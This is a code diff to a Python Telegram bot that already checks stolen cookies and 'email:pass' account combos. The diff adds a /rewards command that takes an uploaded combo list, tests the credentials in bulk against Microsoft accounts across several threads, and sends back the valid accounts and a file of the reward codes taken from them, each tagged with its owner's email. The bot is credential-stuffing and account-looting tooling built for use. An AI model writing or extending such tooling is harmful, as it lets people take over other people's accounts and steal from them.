@@ -5,6 +5,7 @@ from config import BOT_TOKEN, AUTO_DELETE_DELAY
 from utils import *
 from checkers.cookie import COOKIE_CHECKERS
 from checkers.account import ACCOUNT_CHECKERS
+from checkers.microsoft_rewards import check_batch
 
 # ---------- Session store ----------
 sessions = {}
@@ -204,7 +205,8 @@ async def start(update: Update, context):
         "🔵 /regex — toggle regex search\n"
         "🌐 /stream url text — search without download\n\n"
         "🍪 **Cookie Checker:** /cookie site\n"
-        "🔐 **Account Checker:** /account site\n\n"
+        "🔐 **Account Checker:** /account site\n"
+        "🎮 **Rewards Fetcher:** /rewards\n\n"
         "📋 /history — search history\n"
         "🔀 /merge — combine & deduplicate\n"
         "🗂 /batch — queue multiple downloads\n"
@@ -223,7 +225,8 @@ async def help_cmd(update: Update, context):
         f"**Search:** /regex {regex_status} /stream /history /search /clearhistory\n"
         f"**Files:** /merge /cancel\n"
         f"**Cookie Checker:** /cookie [{', '.join(cookie_sites)}]\n"
-        f"**Account Checker:** /account [{', '.join(account_sites)}]\n\n"
+        f"**Account Checker:** /account [{', '.join(account_sites)}]\n"
+        f"**Rewards:** /rewards\n"
         f"Send / for quick help.",
         parse_mode="Markdown")
 
@@ -304,7 +307,7 @@ async def cancel_cmd(update: Update, context):
         session["batch_items"] = []
         await update.message.reply_text("❎ Batch cancelled.")
         return
-    if session.get("state") in ("waiting_cookie_zip", "waiting_account_file"):
+    if session.get("state") in ("waiting_cookie_zip", "waiting_account_file", "waiting_rewards_file"):
         session["state"] = "waiting_urls"
         session["cookie_check_site"] = None
         session["account_check_site"] = None
@@ -330,14 +333,10 @@ async def regex_cmd(update: Update, context):
         sessions[chat_id] = session
     session["regex_mode"] = not session.get("regex_mode", False)
     status = "🔵 ON" if session["regex_mode"] else "⚪ OFF"
-    await update.message.reply_text(
-        f"🔍 Regex: **{status}**\n\n"
-        f"{'Patterns like `error|warning`, `\\d{{3}}-\\d{{4}}` now work.' if session['regex_mode'] else 'Plain text search.'}",
-        parse_mode="Markdown")
+    await update.message.reply_text(f"🔍 Regex: **{status}**", parse_mode="Markdown")
 
 async def history_cmd(update: Update, context):
-    chat_id = update.effective_chat.id
-    session = sessions.get(chat_id, {})
+    session = sessions.get(update.effective_chat.id, {})
     history = session.get("search_history", [])
     if not history:
         await update.message.reply_text("No search history.")
@@ -349,8 +348,7 @@ async def history_cmd(update: Update, context):
     await update.message.reply_text("\n".join(lines), parse_mode="Markdown")
 
 async def search_n_cmd(update: Update, context):
-    chat_id = update.effective_chat.id
-    session = sessions.get(chat_id, {})
+    session = sessions.get(update.effective_chat.id, {})
     history = session.get("search_history", [])
     if not history:
         await update.message.reply_text("No history.")
@@ -370,15 +368,13 @@ async def search_n_cmd(update: Update, context):
     await do_search(update, context, entry['text'], entry['mode'] == 'regex', files)
 
 async def clearhistory_cmd(update: Update, context):
-    chat_id = update.effective_chat.id
-    session = sessions.get(chat_id)
+    session = sessions.get(update.effective_chat.id)
     if session:
         session["search_history"] = []
     await update.message.reply_text("🗑 History cleared.")
 
 async def stream_cmd(update: Update, context):
-    chat_id = update.effective_chat.id
-    session = sessions.get(chat_id, {})
+    session = sessions.get(update.effective_chat.id, {})
     args = context.args
     if len(args) < 2:
         await update.message.reply_text("Usage: /stream url text")
@@ -449,6 +445,33 @@ async def account_cmd(update: Update, context):
     await update.message.reply_text(f"🔐 **Account Checker: {site.upper()}**\n\nUpload a .txt file with `email:pass` combos.\nSend /cancel to abort.")
 
 # ===================================================================
+# MICROSOFT REWARDS
+# ===================================================================
+
+async def rewards_cmd(update: Update, context):
+    chat_id = update.effective_chat.id
+    args = context.args
+    try:
+        threads = int(args[0]) if len(args) > 0 else 10
+        timeout = int(args[1]) if len(args) > 1 else 10
+    except:
+        threads, timeout = 10, 10
+    
+    if chat_id not in sessions:
+        sessions[chat_id] = {}
+    sessions[chat_id]["rewards_threads"] = threads
+    sessions[chat_id]["rewards_timeout"] = timeout
+    sessions[chat_id]["state"] = "waiting_rewards_file"
+    
+    await update.message.reply_text(
+        f"🎮 **Microsoft Rewards Code Fetcher**\n\n"
+        f"Threads: {threads} | Timeout: {timeout}s\n\n"
+        f"Upload a .txt file with `email:pass` combos.\n"
+        f"The bot will check accounts and return any reward codes found.\n\n"
+        f"Send /cancel to abort."
+    )
+
+# ===================================================================
 # BATCH
 # ===================================================================
 
@@ -491,6 +514,38 @@ async def handle_document(update: Update, context):
         sessions[chat_id] = {"files": [], "state": "waiting_urls", "batch_items": [], "regex_mode": False, "search_history": []}
     session = sessions[chat_id]
     state = session.get("state", "")
+
+    # REWARDS CHECKER
+    if state == "waiting_rewards_file":
+        msg = await update.message.reply_text("🎮 Checking Microsoft Rewards accounts...")
+        file = await context.bot.get_file(document.file_id)
+        combo_path = os.path.join(tempfile.mkdtemp(), "combos.txt")
+        await file.download_to_drive(combo_path)
+        with open(combo_path, 'r', encoding='utf-8', errors='ignore') as f:
+            combos = [line.strip() for line in f if line.strip() and ':' in line]
+        os.remove(combo_path)
+        if not combos:
+            await msg.edit_text("❌ No valid combos found.")
+            session["state"] = "waiting_urls"
+            return
+        threads = session.get("rewards_threads", 10)
+        timeout = session.get("rewards_timeout", 10)
+        await msg.edit_text(f"🎮 Checking {len(combos)} accounts (threads={threads})...")
+        import concurrent.futures
+        loop = asyncio.get_event_loop()
+        results = await loop.run_in_executor(None, check_batch, combos, threads, timeout)
+        summary = f"🎮 **Rewards Results**\n\n📋 Total: {results['total']}\n✅ Valid: {len(results['valid_accounts'])}\n❌ Invalid: {len(results['invalid_accounts'])}\n🎁 Codes: {len(results['codes'])}\n"
+        if results['codes']:
+            codes_path = os.path.join(tempfile.mkdtemp(), "rewards_codes.txt")
+            with open(codes_path, 'w') as f:
+                for c in results['codes']:
+                    f.write(f"Code: {c['code']} | {c['title']} | {c['email']}\n")
+            with open(codes_path, 'rb') as doc:
+                await update.message.reply_document(document=doc, filename="rewards_codes.txt", caption=f"🎁 {len(results['codes'])} reward codes found!")
+            os.remove(codes_path)
+        await msg.edit_text(summary, parse_mode="Markdown")
+        session["state"] = "waiting_urls"
+        return
 
     # COOKIE CHECKER: ZIP upload
     if state == "waiting_cookie_zip":
@@ -567,7 +622,7 @@ async def handle_document(update: Update, context):
             combos = [line.strip() for line in f if line.strip() and ':' in line]
         os.remove(combo_path)
         if not combos:
-            await msg.edit_text("❌ No valid combos found. Format: `email:pass`")
+            await msg.edit_text("❌ No valid combos found.")
             session["state"] = "waiting_urls"
             return
         await msg.edit_text(f"🔐 Checking {len(combos)} accounts...")
@@ -711,9 +766,10 @@ def main():
     app.add_handler(CommandHandler("stream", stream_cmd))
     app.add_handler(CommandHandler("cookie", cookie_cmd))
     app.add_handler(CommandHandler("account", account_cmd))
+    app.add_handler(CommandHandler("rewards", rewards_cmd))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
-    print("👑 Universal Bot started (Download + Search + Cookie + Account)")
+    print("👑 Universal Bot started (Download + Search + Cookie + Account + Rewards)")
     app.run_polling()
 
 if __name__ == "__main__":
